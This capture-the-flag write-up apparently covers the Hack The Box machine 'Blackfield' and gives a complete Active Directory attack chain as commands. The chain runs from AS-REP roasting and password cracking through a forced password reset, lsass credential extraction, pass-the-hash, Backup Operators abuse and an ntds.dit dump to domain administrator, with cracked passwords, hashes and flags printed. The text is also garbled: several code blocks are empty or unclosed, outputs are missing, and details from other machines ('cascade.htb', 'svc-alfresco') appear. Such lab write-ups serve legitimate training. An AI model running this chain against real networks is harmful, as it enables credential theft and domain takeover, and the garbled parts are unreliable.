According to the open ports this appears to be a DC, lets move on towards the enumeration of services, nothing further interesting really stands out by just observing the above scan results.

## RPC enumeration as anonymous

**Anonymous login:**
```bash
rpcclient -U "" -N blackfield.htb
```
was not successful

## LDAP enumeration as anonymous

```bash
ldapsearch -LLL -x -H ldap://blackfield.htb -s base namingcontexts 
```

```bash
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
```

**check if anonymous login is allowed**
```bash
ldapsearch -LLL -x -H ldap://cascade.htb -b "DC=cascade,DC=local"
```
i got nothing, so that means thatÂ **anonymous bind is not enabled**

## SMB enumeration as anonymous

**SMB anonymous logon**
```bash
nxc smb blackfield.htb  -u '' -p '' --shares
```

```bash
SMB         10.129.164.18   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)

```

does not appear successful, BUT lets try smbmap too:
```bash
smbmap -H blackfield.htb -u null
```

```bash
[+] Guest session   	IP: blackfield.htb:445	Name: unknown

SYSVOL                                            	NO ACCESS	Logon server share 
```
interesting! it appears that we can view shares via guest session!

Lets try inspecting the shares, the share `forensic` appears to not be a default one, but dont have permissions to view it. So we should focus to the shares that we have `READ ONLY` permissions such as the `IPC$` and `profiles$`
```bash
smbclient -N //blackfield.htb/IPC$
```
got NT_STATUS_NO_SUCH_FILE listing \* , we cant access that share.  

I then inspected the `profiles$` share:
```bash
smbclient -N //blackfield.htb/profiles$
```

```bash
mb: \\> ls
  .                                   D        0  Wed Jun  3 11:47:12 2020

```

its contents appear to be usernames! also each one of them contains nothing, BUT this is a way to collect all users, so i copied all of them in a txt, and then sanitized the usernames so a new txt containing only them is formed:
```bash
awk '{print $1}' share_list.txt > usernames.txt
```

```bash
$ cat usernames.txt 
AAlleni
ABarteski
ABekesz
ABenzies
Foothold
```
great! now that we have the usernames in a format that is usable, we can do a multitude of things.

For example we could try hunting for users that have the flag `DONT_REQ_PREAUTH` enabled, a method called `AS-REP` roasting.

## AS-REP roasting

TO perform AS-REP roasting, i will use `GetNPUsers.py`
```bash
GetNPUsers.py -dc-ip 10.129.164.18 BLACKFIELD.local/ -usersfile usernames.txt > as-rep-roast.txt
```

aand we got an asrep hash! and it appears to be associated with user `support`
```bash
$krb5asrep$23$support@BLACKFIELD.LOCAL:3bbe070692d760efc2224b563d1387b8$8bbe45bc2b5f1e80b063a9ceeb35754757f8851e1307c98d3bfcd05be9382d09ad731a9c6547414b5c15d3540903884aa7cb8aab778286593b5c76ab51ce572cbd9ea69d890c48123bb8cfbd3ceac109d9b46e1dc268625f0a7e08fd12f8f3dbc1117556b3326f259ea5d387c2d230728c00115d7fb525ee58b94dc8564dd511a95dfd327790ff1d44d2e215fd149d887033f5f5263a5c1759d8898ffd9093d5d498d44452bb6c7eef15587853e7941c3b2d1840727b2a09df7b04e8bbd35769537304ba20b08328f4dbb3f17f8b4d26fe910d4a4e4867fa482a9b7e3c130969df69a14092b40675b6a8c64be12f5afe4ecc7fca
```

lets crack it:
```bash
john hash_blackfield_support.txt --wordlist=rockyou.txt
```
the retrieved password is
```bash
#00^BlackKnight
```
so the creds are
```bash
support
#00^BlackKnight
```

Lets now use my script to bulk check the services to which we can login with those creds:

interesting, according the the above output, with those creds, we can login to `RPC` , `SMB` and `LDAP`.
So we should continue to enumerate again, using the obtained credentials this time.

## RPC enumeration as user `support`

```bash
rpcclient -U 'support%#00^BlackKnight' blackfield.htb
```

```bash

```
okay, found some valuable info about users and groups, but for our convenience we will later proceed with LDAP enumeration by using bloodhound so we can get a better graphical representation.

## SMB enumeration as user `support`

```bash
nxc smb blackfield.htb  -u 'support' -p '#00^BlackKnight' --shares
#or
smbmap -H blackfield.htb -u 'support' -p '#00^BlackKnight'
```

```bash
SMB         10.129.164.18   445    DC01             Share           Permissions     Remark

SMB         10.129.164.18   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.164.18   445    DC01             C$                              Default share

SMB         10.129.164.18   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.164.18   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.164.18   445    DC01             profiles$       READ            
SMB         10.129.164.18   445    DC01             SYSVOL          READ            Logon server share 

```

hm with those creds we can `READ` 2 more shares that we could previously as Guest, those are `NETLOGON` and `SYSVOL`, but by inspecting those shares i found nothing useful!

## LDAP enumeration as user `support`

### Bloodhound as support

since we can login to `LDAP` this means we can use bloodhound
```bash
bloodhound-python -u 'support' -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.129.164.18 -c All --zip
```

start bloodhound and inspect the user we currently have access first (support)

`Group Membership` of user `support`
![](MediaFiles/Pasted%20image%2020250809132333.png)
hm apart from being obviously member of the domain users group, no other group memberships observed

`Outbound Object Control` of user `support`
![](MediaFiles/Pasted%20image%2020250809132344.png)
interesting, our owned user has `ForceChangePassword` rights towards `AUDIT2020` user.

We could now inspect this user to identify the full path that we will follow

`Group Membership` of user `AUDIT2020`
![](MediaFiles/Pasted%20image%2020250809132351.png)
hm apart from being obviously member of the domain users group, no other group memberships observed

Since i found nothing further interesting about `AUDIT2020` user, i will proceed to run some queries from bloodhound

`Shortest Paths to Unconstrained Delegation Systems`
![](MediaFiles/Pasted%20image%2020250809132357.png)
hm this means that user `SVC_BACKUP` can remotely login to the DC, lets now inspect `SVC_BACKUP`

`Group Membership` of user `SVC_BACKUP`
![](MediaFiles/Pasted%20image%2020250809132403.png)
nothing else found about this user, this user could be our next target, BUT lets stop for a minute and think.

Okay the path might not be obvious right now, but lets proceed on doing what we already know, so lets proceed on changing the password for user `AUDIT2020` as user `support`.

# Foothold
## Password reset as user `support` towards user `AUDIT2020`

There are multiple ways to do this,
```bash
bloodyAD --host '10.129.164.18' -d 'dc01.blackfield.local' -u 'support' -p '#00^BlackKnight' set password AUDIT2020 Thebestpass0!
```

```bash
[+] Password changed successfully!
```

OR via rpc
```bash
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.129.164.18 -c 'setuserinfo2 audit2020 23 "Thebestpass0!"
```

now the updated creds are:
```bash
audit2020 
Thebestpass0!
```

Lets now use my script to bulk check the services to which we can login with those creds:

[ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check](https://github.com/ch3ckkm8/auto_netexec)

```bash

According to the output above, with these creds we can login to `SMB` , `LDAP` and `RPC`

lets try `SMB` first

## SMB Enumeration with creds as `AUDIT2020`

```bash
nxc smb blackfield.htb  -u 'AUDIT2020' -p 'Thebestpass0!' --shares
#or
smbmap -H blackfield.htb -u 'AUDIT2020' -p 'Thebestpass0!'
```

```bash

```

nice! this user seems to have `READ` permission over the `forensic` share, to which we did not have such permission previously. Lets connect with smbclient to start exploring the share

```bash
smbclient //blackfield.htb/forensic -U audit2020%Thebestpass0!
```

```bash
smb: \\> ls

### File inspection

instead of searching manually, lets download all the shares locally to inspect offline

```bash
nxc smb blackfield.htb  -u 'AUDIT2020' -p 'Thebestpass0!' -M spider_plus -o DOWNLOAD_FLAG=True
```

alright, first lets inspect the `commands_output` since it has fewer contents

`domain_admins.txt`

```bash
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany

```

Very interesting, i dont remember seeing that on bloodhound! lets keep in that in mind and revisit it later

`domain_groups.txt`
```bash

here we see again this user `Ipwn3dYouCompany` which i did not find in bloodhound

the rest of the txt files provide no useful information.

Lets now inspect the `memory_analysis` folder:

very interesting, each one of those is a memory dump file!
well without any hesitation, we must first try doing sth with `lsass.zip` for obvious reasons, lets unzip it first
```bash
unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP 
```

now check what type of file it is
```bash
file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
```

with a little bit of research, i found `pypykatz` would be usefull to dump this file
```bash
pypykatz lsa minidump lsass.DMP

What we see in the output above, is logon sessions, and there is a plaintext hash there for guess who, user `SVC_BACKUP` ! (if you remember from the bloodhound inspection, our goal was to reach this user)

## Logging in as `SVC_BACKUP` via pass the hash

```bash
evil-winrm -i blackfield.htb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
logged in, and grabbed user flag! `3920bb317a0bef51027e2852be64b543`

# Privesc

Lets remember what bloodhound showed us earlier about user `SVC_BACKUP`:

`Shortest Paths to Unconstrained Delegation Systems`
![](MediaFiles/Pasted%20image%2020250809132452.png)
hm this means that user `SVC_BACKUP` can remotely login, lets now inspect `SVC_BACKUP'` group membership:

`Group Membership` of user `SVC_BACKUP`
![](MediaFiles/Pasted%20image%2020250809132504.png)
hm so how do we privesc here? well the simplest thought here to start with, would be that this user is member of `BACKUP OPERATORS` , what do we know about this group?

Members of the **Backup Operators** group can:

1. **Back up any file or folder**, even if they donât have read access to it.
2. **Restore any file or folder**, even if they donât have write access.
3. Log on **locally** (by default, on workstations and servers).
4. **Bypass NTFS permissions** using specific APIs or tools (like `ntbackup`, `robocopy`, `wbadmin`, or `sebackupprivilege`/`serestoreprivilege`).

Nice, this group seems to have potential for privesc, lets see our userâs privileges:

```bash
whoami /priv
```

```bash

### Abusing `BACKUP OPERATORS` privileges

So searching for resources about abusing `BACKUP OPERATORS` i found this:
[https://www.hackingarticles.in/addself-active-directory-abuse/](https://www.hackingarticles.in/addself-active-directory-abuse/)

And according to it, i run the following commands as described there:
```bash
# on your machine:
$ cat raj.dsh 
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:

$ unix2dos raj.dsh

```

### Dumping NTDS using the SYSTEM hive

Finally, run secretsdump to **extract NTLM password hashes** and **other credential data** from an **offline copy of the AD database (`ntds.dit`)**, using the **Boot Key from the `SYSTEM` hive**.
```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

```bash

Almost done now, grab the 2nd part of adminâs hash `184fb5e5178480be64824d4cd53b99ee` and login via winrm.
### Logging in as Administrator via pass the hash

```bash
evil-winrm -i blackfield.htb -u Administrator -H 184fb5e5178480be64824d4cd53b99ee 
```
grabbed root flag! `4375a629c7c67c8e29db269060c955cb`

# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap scan -> target is a DC, chose **smb** , **rpc** and **ldap** services to focus on
2. **enumerate** `LDAP` -> nothing useful
3. **enumerate** `RPC` -> nothing useful
4. **enumerate** `SMB` shares -> found access to share
5. **retrieved usernames** from files contained in that share
6. `AS-REP roasting` was conducted and successfully got AS-REP hash (since the user has The **`Do not require Kerberos preauthentication`** flag enabled (since we had a list of usernames on the recon phase)
7. `cracked` the retrieved hash for a user (support)
8. `correlated` the found creds with the `RPC` ,`SMB`,`LDAP` services
9. enumerated `RPC` as user support, found users, groups
10. enumerated `SMB` as user support, no non default shares found
11. enumerated `LDAP` as user support via `Bloodhound` , found attack path, the compromised user (support) can change pass for another user (audit2020)
#### Foothold
1. `changed password` for user audit2020 as user support
2. `correlated` this user's  creds with the `RPC` ,`SMB`,`LDA` services
3. enumerated `SMB` as user audit2020, found shares
4. the found `shares` contained critical files, that were `memory dumps`
5. chose the `lsass dump` and dumped it, revealing a **NTLM hash** for another user `svc_backup`
6. logged in via win-rm via pass the hash as user `svc_backup`
7. enumerated `LDAP` as user audit2020 via `Bloodhound` , found attack path, the compromised user (support) can change pass for another user (audit2020)
8. **logged in** via evil-winrm to host using on user **svc-alfresco**, and grabbed the ==user flag==.
#### Privesc
1. now that we got foothold, as a user (**svc-backup**) i inspected its `group membership`, which i found that was member of a privileged: group `BACKUP operators`, which after investigation was found that it has permissions to backup files
2. found commands that exploit those privileged group's permissions to retrieve `NTDS.dit` and `SYSTEM hive` and download them offline
3. now these 2 files are available offline, i dumped them using secretsdump which revealed the `NTLM hash` of the `Administrator`
4. using administrator's NTLM hash we **login** via evil-winrm and grab the ==root flag==!

---

# Sidenotes

To conclude, this was a good all around machine. What i learned from this one, for the foothold was that enumeration can have multiple layers, as more users get compromised. As for the privesc part, it was essential to learn about the privileged group's permissions that the compromised user was a member of  and how to exploit them.
